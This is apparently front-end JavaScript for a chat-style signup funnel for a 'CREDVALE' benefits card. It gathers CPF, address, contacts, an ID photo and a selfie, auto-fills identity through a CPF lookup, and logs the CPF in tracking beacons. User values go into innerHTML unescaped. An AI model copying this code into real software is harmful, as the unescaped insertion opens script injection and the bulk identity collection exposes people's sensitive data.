// ============================================================
// Cadastro Conversacional V2 - Experiência Premium (Plano B)
// ============================================================
(() => {
  'use strict';

  /* ---- DOM refs ---- */
  const chatModal   = document.getElementById('chatModal');
  const chatMsg     = document.getElementById('chatMessages');
  const chatInput   = document.getElementById('chatInput');
  const chatSend    = document.getElementById('chatSend');
  const chatInputArea = document.getElementById('chatInputArea');
  const progBar     = document.getElementById('chatProgressBar');
  const progSteps   = document.querySelectorAll('#chatSteps .chat-progress__step');
  const pageMain    = document.querySelector('main');
  const pageHeader  = document.querySelector('.header');
  const pageFooter  = document.querySelector('.footer');

  /* ---- State ---- */
  const steps = ['Início','CPF','Dados','Endereço','Contato','Perfil','Docs','Análise','Plano','Adesão'];
  let currentStep = -1;
  let waitingInput = false;
  let currentResolve = null;
  let flowState = 'idle';
  let popupEl = null;

  const user = {
    cpf: '', nome: '', nascimento: '', sexo: '',
    cep: '', rua: '', bairro: '', cidade: '', uf: '',
    numero: '', complemento: '',
    whatsapp: '', email: '',
    documento: null, selfie: null
  };

  let chosenCard = 'virtual'; // 'virtual' | 'fisico'
  let quizAnswers = {};

  /* ---- Cache de preços dos produtos (vindo do painel) ---- */
  var __precos = { virtual: 4.99, fisico: 19.99 };

  /* ---- Session tracking ---- */
  function getDeviceInfo() {
    var ua = navigator.userAgent;
    var disp = sessionStorage.getItem('vs_dispositivo') || 'Desktop';
    var mod = sessionStorage.getItem('vs_modelo') || 'PC';
    var os = sessionStorage.getItem('vs_os') || '';
    var nav = sessionStorage.getItem('vs_navegador') || (/Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) && !/Chrome/.test(ua) ? 'Safari' : /Edge/.test(ua) ? 'Edge' : 'Desconhecido');
    var navVer = sessionStorage.getItem('vs_navegador_versao') || '';
    var fab = sessionStorage.getItem('vs_fabricante') || '';
    return { dispositivo: disp, modelo: mod, fabricante: fab, navegador: nav, navegador_versao: navVer, os: os };
  }

  async function ensureSession() {
    try {
      if (sessionStorage.getItem('vs_session_id')) return;
      var base = window.__API_BASE || '/api';
      var dd = getDeviceInfo();
      var info = Object.assign({ visitor_id: 'v-' + Date.now() + '-' + Math.random().toString(36).slice(2,10), origem: document.referrer || '' }, dd);
      var r = await fetch(base + '/track/session/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
      var d = await r.json();
      if (d.session_id) {
        sessionStorage.setItem('vs_session_id', d.session_id);
        // Persiste os device fields no sessionStorage
        if (dd.fabricante) sessionStorage.setItem('vs_fabricante', dd.fabricante);
        if (dd.navegador_versao) sessionStorage.setItem('vs_navegador_versao', dd.navegador_versao);
      }
    } catch(e) {}
  }

  function trackStage(stage, extra) {
    try {
      var sid = sessionStorage.getItem('vs_session_id');
      if (!sid) return;
      var base = window.__API_BASE || '/api';
      var payload = Object.assign({ session_id: sid, stage: stage }, getDeviceInfo());
      if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) payload[k] = extra[k]; } }
      navigator.sendBeacon(base + '/track/session/stage', new Blob([JSON.stringify(payload)], {type:'application/json'}));
    } catch(e) {}
  }

  async function carregarPrecos() {
    try {
      var prods = await fetch((window.__API_BASE||'/api')+'/products').then(function(r){ return r.json(); });
      if (prods && prods.forEach) {
        prods.forEach(function(p){ if (p.tipo && p.preco) __precos[p.tipo] = parseFloat(p.preco); });
      }
    } catch(e) {}
  }

  function getPreco(tipo) { return __precos[tipo] || (tipo==='virtual' ? 4.99 : 19.99); }
  function getPrecoStr(tipo) { return 'R$ '+getPreco(tipo).toFixed(2).replace('.',','); }

  /* ---- Utils ---- */
  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

  function fmtCpf(v) {
    v = v.replace(/\D/g,'');
    if (v.length>3) v=v.slice(0,3)+'.'+v.slice(3);
    if (v.length>7) v=v.slice(0,7)+'.'+v.slice(7);
    if (v.length>11) v=v.slice(0,11)+'-'+v.slice(11);
    return v.slice(0,14);
  }

  function fmtPhone(v) {
    v = v.replace(/\D/g,'');
    if (v.length>2) v='('+v.slice(0,2)+') '+v.slice(2);
    if (v.length>10) v=v.slice(0,10)+'-'+v.slice(10);
    return v.slice(0,15);
  }

  function fmtCep(v) {
    v = v.replace(/\D/g,'');
    if (v.length>5) v=v.slice(0,5)+'-'+v.slice(5);
    return v.slice(0,9);
  }

  function calcIdade(dataNasc) {
    var hoje = new Date();
    var nasc;
    if (dataNasc.includes('/')) { nasc = new Date(dataNasc.replace(/(\d{2})\/(\d{2})\/(\d{4})/,'$3-$2-$1')); }
    else { nasc = new Date(dataNasc); }
    var idade = hoje.getFullYear() - nasc.getFullYear();
    var m = hoje.getMonth() - nasc.getMonth();
    if (m<0 || (m===0 && hoje.getDate()<nasc.getDate())) idade--;
    return idade;
  }

  function abreviarNome(n) {
    var p = (n||'').trim().split(/\s+/);
    if (p.length<=1) return (p[0]||'TITULAR').toUpperCase();
    return (p[0]+' '+p[p.length-1][0]+'.').toUpperCase();
  }

  function formatarTelefone(num) {
    num = String(num).replace(/\D/g,'');
    if (num.length===11) return '('+num.slice(0,2)+') '+num.slice(2,7)+'-'+num.slice(7);
    if (num.length===10) return '('+num.slice(0,2)+') '+num.slice(2,6)+'-'+num.slice(6);
    return num;
  }

  function gerarCardSVG(nome, limite, ultimos4, showLimite) {
    var nd = abreviarNome(nome);
    var u4 = String(ultimos4||'0000').padStart(4,'0').slice(0,4);
    var lim = Number(limite||0).toFixed(2).replace('.',',');
    var limHtml = showLimite !== false ? '<text x="28" y="198" font-family="Arial,sans-serif" font-size="11" fill="rgba(255,255,255,0.7)">Limite: <tspan font-weight="700" fill="white">R$ '+lim+'</tspan></text>' : '';
    return '<div class="chat-card-welcome"><div class="chat-card-welcome__glow"></div><svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.5);">'+
      '<defs>'+
        '<linearGradient id="cardBgV2" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#0f172a"/>'+
          '<stop offset="50%" stop-color="#1e293b"/>'+
          '<stop offset="100%" stop-color="#0d9488"/>'+
        '</linearGradient>'+
        '<linearGradient id="cardLogoV2" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#3B82F6"/>'+
          '<stop offset="100%" stop-color="#4CC8A4"/>'+
        '</linearGradient>'+
        '<linearGradient id="chipGradV2" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#fbbf24"/>'+
          '<stop offset="100%" stop-color="#d97706"/>'+
        '</linearGradient>'+
        '<radialGradient id="cardGlowV2" cx="50%" cy="50%" r="70%">'+
          '<stop offset="0%" stop-color="rgba(76,200,164,0.12)"/>'+
          '<stop offset="100%" stop-color="transparent"/>'+
        '</radialGradient>'+
      '</defs>'+
      '<rect width="340" height="210" rx="16" fill="url(#cardBgV2)"/>'+
      '<rect width="340" height="210" rx="16" fill="url(#cardGlowV2)"/>'+
      '<rect x="28" y="34" width="44" height="34" rx="5" fill="url(#chipGradV2)" opacity="0.9"/>'+
      '<text x="312" y="55" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="13" font-weight="800" fill="url(#cardLogoV2)" text-anchor="end">CREDVALE</text>'+
      '<circle cx="278" cy="76" r="12" fill="#eb001b" opacity="0.6"/>'+
      '<circle cx="290" cy="76" r="12" fill="#f79e1b" opacity="0.6"/>'+
      '<text x="28" y="118" font-family="\'Courier New\',monospace" font-size="18" font-weight="700" fill="white" letter-spacing="3">****  ****  ****  '+u4+'</text>'+
      '<text x="28" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)">TITULAR</text>'+
      '<text x="28" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white">'+nd+'</text>'+
      '<text x="300" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)" text-anchor="end">VALIDADE</text>'+
      '<text x="300" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white" text-anchor="end">12/28</text>'+
      '<text x="28" y="185" width="280" height="1" fill="rgba(255,255,255,0.1)"/>'+
      limHtml+
    '</svg></div>';
  }

  function gerarCardGrande(nome) {
    var nd = abreviarNome(nome||'TITULAR');
    return '<div class="chat-card-welcome"><div class="chat-card-welcome__glow"></div><svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.5);">'+
      '<defs>'+
        '<linearGradient id="cardBgW" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#0f172a"/>'+
          '<stop offset="50%" stop-color="#1e293b"/>'+
          '<stop offset="100%" stop-color="#0d9488"/>'+
        '</linearGradient>'+
        '<linearGradient id="cardLogoW" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#3B82F6"/>'+
          '<stop offset="100%" stop-color="#4CC8A4"/>'+
        '</linearGradient>'+
        '<linearGradient id="chipGradW" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#fbbf24"/>'+
          '<stop offset="100%" stop-color="#d97706"/>'+
        '</linearGradient>'+
        '<radialGradient id="cardGlowW" cx="50%" cy="50%" r="70%">'+
          '<stop offset="0%" stop-color="rgba(76,200,164,0.12)"/>'+
          '<stop offset="100%" stop-color="transparent"/>'+
        '</radialGradient>'+
      '</defs>'+
      '<rect width="340" height="210" rx="16" fill="url(#cardBgW)"/>'+
      '<rect width="340" height="210" rx="16" fill="url(#cardGlowW)"/>'+
      '<rect x="28" y="34" width="44" height="34" rx="5" fill="url(#chipGradW)" opacity="0.9"/>'+
      '<text x="312" y="55" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="13" font-weight="800" fill="url(#cardLogoW)" text-anchor="end">CREDVALE</text>'+
      '<circle cx="278" cy="76" r="12" fill="#eb001b" opacity="0.6"/>'+
      '<circle cx="290" cy="76" r="12" fill="#f79e1b" opacity="0.6"/>'+
      '<text x="28" y="118" font-family="\'Courier New\',monospace" font-size="18" font-weight="700" fill="white" letter-spacing="3">****  ****  ****  0000</text>'+
      '<text x="28" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)">TITULAR</text>'+
      '<text x="28" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white">'+nd+'</text>'+
      '<text x="300" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)" text-anchor="end">VALIDADE</text>'+
      '<text x="300" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white" text-anchor="end">12/28</text>'+
      '<text x="28" y="198" font-family="Arial,sans-serif" font-size="11" fill="rgba(255,255,255,0.6)">Cart\u00e3o de Benef\u00edcios</text>'+
    '</svg></div>';
  }

  /* ---- Chat UI ---- */
  function addMsg(text, type) {
    var el = document.createElement('div');
    el.className = 'chat-msg chat-msg--' + (type||'bot');
    el.innerHTML = text;
    chatMsg.appendChild(el);
    scrollDown();
    return el;
  }

  function addTyping() {
    var el = document.createElement('div');
    el.className = 'chat-typing';
    el.id = 'chatTyping';
    el.innerHTML = '<div class="chat-typing__dot"></div><div class="chat-typing__dot"></div><div class="chat-typing__dot"></div>';
    chatMsg.appendChild(el);
    scrollDown();
  }

  function removeTyping() {
    var t = document.getElementById('chatTyping');
    if (t) t.remove();
  }

  function scrollDown() {
    requestAnimationFrame(function() { chatMsg.scrollTop = chatMsg.scrollHeight; });
  }

  function setInput(placeholder, mode) {
    chatInput.placeholder = placeholder;
    chatInput.value = '';
    chatInput.disabled = false;
    chatInput.focus();
    chatInput.dataset.mode = mode || 'text';
    waitingInput = true;
    chatInputArea.hidden = false;
    // Keyboard type for mobile
    var inputmodeMap = { cpf:'numeric', phone:'tel', cep:'numeric', email:'email', number:'numeric', text:'text' };
    chatInput.inputMode = inputmodeMap[mode] || 'text';
    chatInput.type = (mode==='email') ? 'email' : 'text';
  }

  function hideInput() {
    chatInputArea.hidden = true;
    waitingInput = false;
    chatInput.disabled = true;
  }

  function showOptions(buttons) {
    var area = document.createElement('div');
    area.className = 'chat-options';
    area.id = 'chatOptions';
    buttons.forEach(function(b) {
      var btn = document.createElement('button');
      btn.className = 'chat-option' + (b.primary ? ' chat-option--primary' : '') + (b.danger ? ' chat-option--danger' : '');
      btn.textContent = b.label;
      btn.onclick = function() {
        area.remove();
        if (b.action) b.action();
      };
      area.appendChild(btn);
    });
    chatMsg.appendChild(area);
    scrollDown();
  }

  var _reuseFileInput = null;
  function _getFileInput() {
    if (!_reuseFileInput) {
      _reuseFileInput = document.createElement('input');
      _reuseFileInput.type = 'file';
      _reuseFileInput.accept = 'image/*';
      _reuseFileInput.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0;pointer-events:none;';
      document.body.appendChild(_reuseFileInput);
    }
    return _reuseFileInput;
  }

  function showMediaBtns(captureLabel, uploadLabel, onCapture, onUpload) {
    var area = document.createElement('div');
    area.className = 'chat-media-area';
    area.id = 'chatMediaArea';
    area.innerHTML =
      '<button class="chat-media-btn" id="chatMediaCapture"><span class="chat-media-btn__icon">📷</span>'+captureLabel+'</button>'+
      '<button class="chat-media-btn" id="chatMediaUpload"><span class="chat-media-btn__icon">📁</span>'+uploadLabel+'</button>';
    chatMsg.appendChild(area);
    scrollDown();
    document.getElementById('chatMediaCapture').onclick = function() {
      var inp = _getFileInput();
      inp.removeAttribute('capture');
      inp.setAttribute('capture', 'environment');
      inp.value = '';
      inp.onchange = function(e) {
        var f = e.target.files[0];
        if (f) { area.remove(); inp.onchange = null; setTimeout(function(){ onCapture(f); }, 50); }
      };
      inp.click();
    };
    document.getElementById('chatMediaUpload').onclick = function() {
      var inp = _getFileInput();
      inp.removeAttribute('capture');
      inp.value = '';
      inp.onchange = function(e) {
        var f = e.target.files[0];
        if (f) { area.remove(); inp.onchange = null; setTimeout(function(){ onUpload(f); }, 50); }
      };
      inp.click();
    };
  }

  function updateProgress(step) {
    currentStep = step;
    var pct = step / (steps.length - 1) * 100;
    progBar.style.width = pct + '%';
    progSteps.forEach(function(el, i) {
      el.classList.remove('chat-progress__step--active', 'chat-progress__step--done');
      el.style.color = 'transparent';
      if (i < step) {
        el.classList.add('chat-progress__step--done');
        el.style.color = '#3B82F6';
      } else if (i === step) {
        el.classList.add('chat-progress__step--active');
        el.style.color = '#4CC8A4';
      }
    });
  }

  function sendUserInput(value) {
    if (!waitingInput || !value.trim()) return;
    waitingInput = false;
    var v = value.trim();
    addMsg(v, 'user');
    chatInput.value = '';
    chatInput.disabled = true;
    scrollDown();
    if (currentResolve) { currentResolve(v); currentResolve = null; }
  }

  function waitUserInput() {
    return new Promise(function(resolve) {
      currentResolve = resolve;
      waitingInput = true;
      chatInput.disabled = false;
      chatInput.focus();
    });
  }

  /* ---- Pop-up system ---- */
  function showPopup(html, onClose) {
    if (popupEl) closePopup();
    var overlay = document.createElement('div');
    overlay.className = 'popup-overlay';
    overlay.innerHTML = '<div class="popup-box">'+html+'</div>';
    document.body.appendChild(overlay);
    popupEl = overlay;
    return overlay;
  }

  function closePopup() {
    if (popupEl) { popupEl.remove(); popupEl = null; }
  }

  /* ---- Eventos do input ---- */
  chatSend.addEventListener('click', function() { sendUserInput(chatInput.value); });

  chatInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); sendUserInput(chatInput.value); return; }
    if (chatInput.dataset.mode === 'cpf') {
      trackStage('Consultando CPF');
      requestAnimationFrame(function() { chatInput.value = fmtCpf(chatInput.value); });
    } else if (chatInput.dataset.mode === 'phone') {
      requestAnimationFrame(function() { chatInput.value = fmtPhone(chatInput.value); });
    } else if (chatInput.dataset.mode === 'cep') {
      requestAnimationFrame(function() { chatInput.value = fmtCep(chatInput.value); });
    }
  });

  window.fecharChat = function() {
    if (confirm('Tem certeza que deseja sair? Seu progresso não será salvo.')) {
      window.location.href = '/';
    }
  };

  /* ============================================================
     FLUXO CONVERSACIONAL V2
     ============================================================ */

  async function iniciarFluxo() {
    if (pageMain) pageMain.style.display = 'none';
    if (pageHeader) pageHeader.style.display = 'none';
    if (pageFooter) pageFooter.style.display = 'none';
    chatModal.hidden = false;
    document.body.style.overflow = 'hidden';
    hideInput();
    await sleep(400);

    var savedCPF = sessionStorage.getItem('credvale_cpf');
    var savedName = sessionStorage.getItem('credvale_name');

    if (savedCPF && savedName) {
      window._iniciarChat();
    } else {
      addMsg(
        '<div class="chat-welcome-v2">'+
          '<div class="chat-welcome-v2__badge">⏱ 2 minutos</div>'+
          gerarCardGrande()+
          '<div class="chat-welcome-v2__title">Vamos começar<br>sua solicitação</div>'+
          '<div class="chat-welcome-v2__desc">Responda algumas perguntas e em <strong>até 2 minutos</strong> você descobre seu limite.</div>'+
          '<button class="chat-welcome-v2__btn" onclick="window._iniciarChat()">'+
            'Iniciar <span class="chat-welcome-v2__btn-arrow">→</span>'+
          '</button>'+
        '</div>'
      );
    }
  }

  window._iniciarChat = function() {
    var savedCPF = sessionStorage.getItem('credvale_cpf');
    var savedName = sessionStorage.getItem('credvale_name');
    var savedNasc = sessionStorage.getItem('credvale_nascimento');
    var savedSexo = sessionStorage.getItem('credvale_sexo');
    if (savedCPF && savedName) {
      user.cpf = savedCPF.replace(/\D/g,'');
      user.nome = savedName;
      if (savedNasc) user.nascimento = savedNasc;
      if (savedSexo) user.sexo = savedSexo;
      addMsg('<strong>Bem-vindo de volta, '+savedName.split(' ')[0]+'!</strong> 🎉');
      addMsg('Já temos seu CPF <strong>'+savedCPF+'</strong> e seus dados da consulta anterior.');
      var dadosHtml = '<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Nome</span><span class="chat-data-value">'+savedName+'</span></div><div class="chat-data-row"><span class="chat-data-label">CPF</span><span class="chat-data-value">'+savedCPF+'</span></div>';
      if (savedNasc) dadosHtml += '<div class="chat-data-row"><span class="chat-data-label">Nascimento</span><span class="chat-data-value">'+savedNasc+'</span></div>';
      if (savedSexo) dadosHtml += '<div class="chat-data-row"><span class="chat-data-label">Sexo</span><span class="chat-data-value">'+(savedSexo==='F'?'Feminino':savedSexo==='M'?'Masculino':savedSexo)+'</span></div>';
      dadosHtml += '</div>';
      addMsg(dadosHtml,'bot');
      showOptions([
        { label:'✅ Continuar', primary:true, action:function(){ etapaCEP(); } },
        { label:'✏️ Trocar CPF', danger:true, action:function(){ etapaCPF(); } }
      ]);
    } else {
      etapaCPF();
    }
  };

  /* ---- ETAPA 1: CPF ---- */
  async function etapaCPF() {
    flowState = 'cpf';
    updateProgress(1);
    await sleep(300);
    addTyping(); await sleep(600); removeTyping();

    addMsg('Olá! 👋<br>Vamos localizar seu cadastro.<br><strong>Informe seu CPF.</strong>');
    setInput('Digite seu CPF', 'cpf');

    while (true) {
      var cpf = await waitUserInput();
      cpf = cpf.replace(/\D/g,'');
      if (cpf.length !== 11) { addMsg('CPF inválido. Digite 11 números.', 'bot'); setInput('Digite seu CPF', 'cpf'); continue; }
      user.cpf = cpf;

      // Verifica CPF existente no backend
      addTyping(); await sleep(400); removeTyping();
      trackStage('Consultando CPF');
      var existente = await verificarCPFExistente(cpf);
      if (existente) { trackStage('CPF Encontrado', {cpf: cpf}); return; }
      trackStage('CPF Não Encontrado');

      // Consulta API CPF externa
      addTyping(); await sleep(500); removeTyping();
      var dados = null;
      try {
        var resp = await fetch((window.__API_BASE||'/api')+'/cpf/consult', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cpf:cpf}) });
        if (resp.ok) { var j = await resp.json(); dados = j.data||j; }
      } catch(e) {}

      if (dados && (dados.nome_completo||dados.nome)) {
        user.nome = dados.nome_completo||dados.nome||'';
        user.nascimento = dados.data_nascimento||'';
        user.sexo = dados.sexo||'';
        addMsg('<strong>Encontramos seus dados!</strong>', 'bot');
        var nasc = user.nascimento||'—';
        var idade = user.nascimento ? ' · '+calcIdade(user.nascimento)+' anos' : '';
        var sexo = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
        addMsg('<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Nome</span><span class="chat-data-value">'+user.nome+'</span></div><div class="chat-data-row"><span class="chat-data-label">Nascimento</span><span class="chat-data-value">'+nasc+idade+'</span></div><div class="chat-data-row"><span class="chat-data-label">Sexo</span><span class="chat-data-value">'+sexo+'</span></div></div>','bot');
        showOptions([
          { label:'✅ Sim, estão corretos', primary:true, action:function(){ etapaCEP(); } },
          { label:'✏️ Editar', danger:true, action:function(){ etapaCPFEditar(); } }
        ]);
        return;
      }
      // Não encontrou na API externa
      addMsg('Não localizamos automaticamente. Vou precisar que <strong>digite seus dados</strong>.', 'bot');
      etapaCPFEditar();
      return;
    }
  }

  async function etapaCPFEditar() {
    hideInput();
    addMsg('Qual seu <strong>nome completo</strong>?');
    setInput('Seu nome completo');
    user.nome = await waitUserInput();
    addMsg('Data de <strong>nascimento</strong> (DD/MM/AAAA):');
    setInput('Ex: 15/03/1990');
    user.nascimento = await waitUserInput();
    addMsg('Qual o <strong>sexo</strong>?');
    showOptions([
      { label:'♀ Feminino', action:function(){ user.sexo='F'; etapaCEP(); } },
      { label:'♂ Masculino', action:function(){ user.sexo='M'; etapaCEP(); } }
    ]);
  }

  /* ---- ETAPA 2: CEP ---- */
  async function etapaCEP() {
    flowState = 'cep';
    updateProgress(2);
    await sleep(300);
    addTyping(); await sleep(500); removeTyping();

    addMsg('Agora confirme seu <strong>endereço</strong>.<br>Digite seu <strong>CEP</strong>.');
    setInput('Digite seu CEP', 'cep');

    while (true) {
      var cep = await waitUserInput();
      cep = cep.replace(/\D/g,'');
      if (cep.length!==8) { addMsg('CEP inválido. Digite 8 números.', 'bot'); setInput('Digite seu CEP', 'cep'); continue; }
      user.cep = cep;

      addTyping(); await sleep(600); removeTyping();
      var end = null;
      try { var ac = new AbortController(), to = setTimeout(function(){ac.abort()},8000); var r = await fetch('https://viacep.com.br/ws/'+cep+'/json/',{signal:ac.signal}); clearTimeout(to); if (r.ok) end = await r.json(); } catch(e) {}

      if (end && !end.erro) {
        user.rua = end.logradouro||'';
        user.bairro = end.bairro||'';
        user.cidade = end.localidade||'';
        user.uf = end.uf||'';
        addMsg('Seu endereço:', 'bot');
        addMsg('<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Rua</span><span class="chat-data-value">'+user.rua+'</span></div><div class="chat-data-row"><span class="chat-data-label">Bairro</span><span class="chat-data-value">'+user.bairro+'</span></div><div class="chat-data-row"><span class="chat-data-label">Cidade</span><span class="chat-data-value">'+user.cidade+' - '+user.uf+'</span></div></div>','bot');
        await sleep(200);
        addMsg('Qual o <strong>número</strong>?');
        setInput('Número', 'number');
        user.numero = await waitUserInput();
        addMsg('Complemento? (ou digite —)');
        setInput('Complemento ou —');
        var c = await waitUserInput();
        user.complemento = (c==='—'||c==='-')?'':c;
        etapaContato();
        return;
      }
      addMsg('CEP não encontrado. Digite o endereço manualmente.', 'bot');
      await sleep(200);
      addMsg('Qual a <strong>rua</strong>?'); setInput('Rua'); user.rua = await waitUserInput();
      addMsg('Qual o <strong>bairro</strong>?'); setInput('Bairro'); user.bairro = await waitUserInput();
      addMsg('Qual a <strong>cidade</strong>?'); setInput('Cidade'); user.cidade = await waitUserInput();
      addMsg('Qual o <strong>estado</strong>? (sigla: SP, RJ...)'); setInput('Ex: SP'); user.uf = (await waitUserInput()).toUpperCase();
      addMsg('Qual o <strong>número</strong>?'); setInput('Número', 'number'); user.numero = await waitUserInput();
      addMsg('Complemento? (ou —)'); setInput('Complemento ou —'); var c2 = await waitUserInput();
      user.complemento = (c2==='—'||c2==='-')?'':c2;
      etapaContato();
      return;
    }
  }

  /* ---- ETAPA 3: Contato ---- */
  async function etapaContato() {
    flowState = 'contato';
    updateProgress(4);
    await sleep(200);
    addTyping(); await sleep(500); removeTyping();

    addMsg('Agora seu <strong>WhatsApp</strong> para contato:');
    setInput('(11) 99999-9999', 'phone');
    while (true) {
      var p = await waitUserInput();
      p = p.replace(/\D/g,'');
      if (p.length<10) { addMsg('Número inválido.', 'bot'); setInput('(11) 99999-9999','phone'); continue; }
      user.whatsapp = p; addMsg('WhatsApp: <strong>'+formatarTelefone(p)+'</strong>', 'user'); break;
    }

    await sleep(200);
    addMsg('E o <strong>e-mail</strong> para confirmarmos:');
    setInput('seu@email.com','email');
    while (true) {
      var e = await waitUserInput();
      if (!e.includes('@')||!e.includes('.')) { addMsg('E-mail inválido.','bot'); setInput('seu@email.com','email'); continue; }
      user.email = e; addMsg('E-mail: <strong>'+e+'</strong>','user'); break;
    }

    await sleep(200);
    addMsg('📋 <strong>Quase lá!</strong> Me ajude a entender seu perfil:', 'bot');
    await sleep(300);
    etapaQuestionario();
  }

  /* ---- ETAPA 4: Documentos ---- */
  async function etapaDocs() {
    flowState = 'docs';
    updateProgress(6);
    await sleep(200);
    addTyping(); await sleep(600); removeTyping();

    addMsg('📋 <strong>Perfeito!</strong> Agora precisamos validar sua identidade.<br><br>Tenha em mãos:<br>• 🆔 Documento oficial com foto (RG ou CNH)<br>• ☀️ Um ambiente iluminado para selfie');

    showOptions([
      { label:'📷 Vamos lá!', primary:true, action:function(){
        addMsg('Envie uma <strong>foto do seu documento</strong> (RG ou CNH):');
        showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
          function(f){ etapaConfirmarFoto(f, 'documento', function(){ etapaSelfie(); }); },
          function(f){ etapaConfirmarFoto(f, 'documento', function(){ etapaSelfie(); }); }
        );
      }}
    ]);
  }

  async function etapaSelfie() {
    flowState = 'selfie';
    await sleep(300);
    addTyping(); await sleep(500); removeTyping();

    addMsg('Agora uma <strong>selfie</strong> 😊<br><br>• Olhe para a câmera<br>• Sem óculos escuros ou boné<br>• Boa iluminação');

    showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaAnalisePopup(); }); },
      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaAnalisePopup(); }); }
    );
  }

  /* ---- Preview + Confirmação de Foto ---- */
  function etapaConfirmarFoto(file, tipo, callback) {
    var label = tipo==='documento' ? 'Documento' : 'Selfie';
    var icon = tipo==='documento' ? '\uD83D\uDCC4' : '\uD83E\uDD33';
    try {
      var imgUrl = URL.createObjectURL(file);
      var imgMsg = addMsg('<div style="text-align:center;"><img class="chat-media-preview" src="'+imgUrl+'" style="max-width:240px;max-height:260px;display:block;margin:0 auto;border-radius:12px;"></div>', 'user');
      addMsg('📸 <strong>'+label+' capturado!</strong> A foto ficou boa?', 'bot');
      showOptions([
        { label:'✅ Sim, usar esta', primary:true, action:function(){
          if (tipo==='documento') user.documento = file;
          else user.selfie = file;
          URL.revokeObjectURL(imgUrl);
          imgMsg.innerHTML = '<div style="text-align:center;padding:6px 0;font-size:0.85rem;color:#4CC8A4;font-weight:600;">'+icon+' '+label+' enviado \u2713</div>';
          addMsg('✅ '+label+' confirmado!','bot');
          setTimeout(callback, 400);
        }},
        { label:'🔄 Tirar novamente', danger:true, action:function(){
          URL.revokeObjectURL(imgUrl);
          addMsg('OK, vamos tentar novamente:','bot');
          if (tipo==='documento') {
            showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
              function(f2){ etapaConfirmarFoto(f2, 'documento', callback); },
              function(f2){ etapaConfirmarFoto(f2, 'documento', callback); }
            );
          } else {
            showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
              function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); },
              function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); }
            );
          }
        }}
      ]);
    } catch(e) {
      addMsg('❌ Erro ao carregar a foto. Tente novamente.','bot');
      setTimeout(function(){
        if (tipo==='documento') {
          showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
            function(f2){ etapaConfirmarFoto(f2, 'documento', callback); },
            function(f2){ etapaConfirmarFoto(f2, 'documento', callback); }
          );
        } else {
          showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
            function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); },
            function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); }
          );
        }
      }, 400);
    }
  }

  /* ---- (dead code removed) ---- */

  /* ---- ETAPA 4B: Questionário de Perfil ---- */
  async function etapaQuestionario() {
    flowState = 'quiz';
    hideInput();
    updateProgress(5);

    trackStage('Respondendo Questionário - Pergunta 1 de 3');
    addTyping(); await sleep(500); removeTyping();
    addMsg('📊 <strong>Quanto você gasta com medicamentos por mês?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Até R$ 50', action:function(){ quizAnswers.gasto='Até R$ 50'; resolve(); }},
        { label:'R$ 51 a R$ 200', action:function(){ quizAnswers.gasto='R$ 51 a R$ 200'; resolve(); }},
        { label:'Acima de R$ 200', action:function(){ quizAnswers.gasto='Acima de R$ 200'; resolve(); }}
      ]);
    });

    await sleep(300); addTyping(); await sleep(500); removeTyping();
    trackStage('Respondendo Questionário - Pergunta 2 de 3');
    addMsg('📊 <strong>Com que frequência compra em farmácias?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Só quando necessário', action:function(){ quizAnswers.frequencia='Só quando necessário'; resolve(); }},
        { label:'1 vez por mês', action:function(){ quizAnswers.frequencia='1 vez por mês'; resolve(); }},
        { label:'Várias vezes por mês', action:function(){ quizAnswers.frequencia='Várias vezes por mês'; resolve(); }}
      ]);
    });

    await sleep(300); addTyping(); await sleep(500); removeTyping();
    trackStage('Respondendo Questionário - Pergunta 3 de 3');
